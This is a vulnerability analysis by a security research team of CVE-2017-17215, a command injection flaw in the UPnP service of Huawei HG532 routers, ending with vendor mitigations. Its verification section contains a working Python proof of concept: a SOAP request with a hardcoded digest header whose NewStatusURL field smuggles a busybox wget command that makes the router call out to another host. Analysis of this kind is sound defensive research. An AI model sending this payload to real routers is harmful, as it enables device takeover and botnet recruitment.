Author: 404 Security Team @ Knownsec  
Chinese version: <https://paper.seebug.org/490/>

#### Background

Huawei HG532 Series Router is a high-speed wireless router designed for
household and small office customers. On Nov.27，Check Point researchers
reported an RCE(remote command execution) vulnerability (CVE-2017-17215)
related to Huawei HG532 Routers[【1】](https://research.checkpoint.com/good-zero-day-skiddie/ "Check Point vulnerability report").

Before being discovered and reported, this unnoticed Zero-Day vulnerability
had already attracted numerous attacks on the Internet, and many exploit
packages have already spread all over the world in many countries and regions.
The delivered payload has been identified as OKIRU/SATORI, an updated variant
of Mirai. The main function of this payload is to send elaborated UDP/TCP
message so as to launch DDoS(Distributed Denial of Service) against targets,
which is pretty simple.

On Nor.23, ZoomEye Network Detector System also had captured this payload.

![](https://images.seebug.org/content/images/2018/01/ab2edd18-bdc6-443f-8faf-a08b2678008d.png-w331s)

#### Vulnerability Analyzation

##### Download Firmware

There is a public firmware, HG532e version, available on the Internet.
Download link:
[【2】](https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar
"HG532e firmware download link")

After downloading, directly using binwalk to extract it.

![](https://images.seebug.org/content/images/2018/01/2fdafce5-8e54-4bec-bd5e-581f4d80c68b.png-w331s)

The target system is 32-bit, big-endian MIPS architecture.

##### Vulnerability Analyzation

According to the report of Check
Point[【1】](https://research.checkpoint.com/good-zero-day-skiddie/ "Check Point
vulnerability report"), the vulnerability point of the RCE vulnerability is
located in the UPnP service.

Universal Plug and Play (UPnP) is a set of networking protocols that permits
networked devices, such as personal computers, printers, Internet gateways,
Wi-Fi access points and mobile devices to seamlessly discover each other's
presence on the network and establish functional network services for data
sharing, communications, and entertainment.

Directly analyzing the code-named "upnp", responsible for UPnP service, with
IDA pro and utilizing the string, "NewStatusURL", to locate the vulnerability
point.

![](https://images.seebug.org/content/images/2018/01/f9f4db4f-f1dd-4767-accd-452be9c4024f.jpeg-w331s)

Keeping track of the cross-referenced data

![](https://images.seebug.org/content/images/2018/01/3353bdf7-ef61-4733-af18-d4e5ff9db022.png-w331s)

The vulnerability shows as below:

![](https://images.seebug.org/content/images/2018/01/6b5a93f4-ce48-4477-9c70-00921569238f.png-w331s)

The definition of the function ATP_XML_GetChildNodeByName as below:

![](https://images.seebug.org/content/images/2018/01/96f564c6-cc2e-4eec-984e-4c0fa5c06652.png-w331s)
![](https://images.seebug.org/content/images/2018/01/a52604df-c456-4d85-b7fd-471e27a78734.png-w331s)

Firstly, this program did the parse of SOAP XML message and received the value
of two elements, NewDownloadURL and NewStatusURL.

Then, this program did the following joint and called system() function to
execute finally.

    
    
    snprintf($s0, 0x400, 'upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -', NewDownloadURL, NewStatusURL)
    
    system($s0)

`upg` is one upgrade program for routers and its parameters are as follows.

![](https://images.seebug.org/content/images/2018/01/7aeb4299-8964-4b2d-923b-8f8d54df5685.jpeg-w331s)

Now, we have two points to execute command injection, one is NewDownloadURL
and the other is NewStatusURL.

##### Vulnerability verification

The target system provides the following commands.

![](https://images.seebug.org/content/images/2018/01/7604a7b3-9c71-4ced-8b5b-9f86ff74c6d0.png-w331s)

Utilizing wget command to test the vulnerability. Sending the following
message.

    
    
    import requests
    
    headers = {
        "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
    }
    
    data = '''<?xml version="1.0" ?>
     <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
       <NewStatusURL>;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;</NewStatusURL>
       <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
      </u:Upgrade>
     </s:Body>
    </s:Envelope>
    '''
    requests.post('http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)

As you see, we receive the request on the listened port successfully.

![](https://images.seebug.org/content/images/2018/01/63d3c129-d539-4c21-b9c5-dc00dbf40ffb.png-w331s)

It is worth mentioning that the UPnP service and firewall of HG532e routers
are enabled by default. The default level of the firewall is low.

![](https://images.seebug.org/content/images/2018/01/ba7eeca8-bcf0-488b-a9eb-519bd64cee25.png-w331s)

Under default configurations, any access to 37215 port though WAN will be
intercepted, leading the defeat of vulnerability exploitation.

![](https://images.seebug.org/content/images/2018/01/54a478b6-113a-4d9b-be04-c2e68dfdd4d8.png-w331s)

##### Protection scheme

On Nor.30, the Huawei released the security
notice[【4】](http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en "Huawei's Security Notice") and verified this
vulnerability.

The notice mentioned the following measures to mitigate the situations.

  * Configure the built-in firewall function.
  * Change the default password.
  * Deploy a firewall at the carrier side.

Due to the absence of the firmware upgrade packages, there is no patches
analyzation.

#### Conclusion

  1. Similar to the command injection in SetNTPServers, Broadband Routers in Ireland[【3】](https://www.seebug.org/vuldb/ssvid-97024 "Eir’s D1000 Modem Is Wide Open To Being Hacked."), this vulnerability seems to be a simple concatenation of command.
  2. This vulnerability also provides a good direction for researchers when discovering vulnerabilities. Pay more attention to the code near the functions like snprintf() and system(). 
  3. Any variations which can access to functions are detrimental. Most RCE vulnerabilities happen with the lack of filtration, leading to the command concatenation, or without suitable control for the length of variations, causing the buffer overflow. In term of this point, equipment supplier is supposed to undertake the responsibility. It is important to develop software with security awareness.

#### Reference link

【1】: Check Point vulnerability report  
<https://research.checkpoint.com/good-zero-day-skiddie/>  
【2】: HG532e firmware download link  
<https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar>  
【3】: Eir’s D1000 Modem Is Wide Open To Being Hacked.  
<https://www.seebug.org/vuldb/ssvid-97024>  
【4】: Huawei's Security Notice  
<http://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/508/>

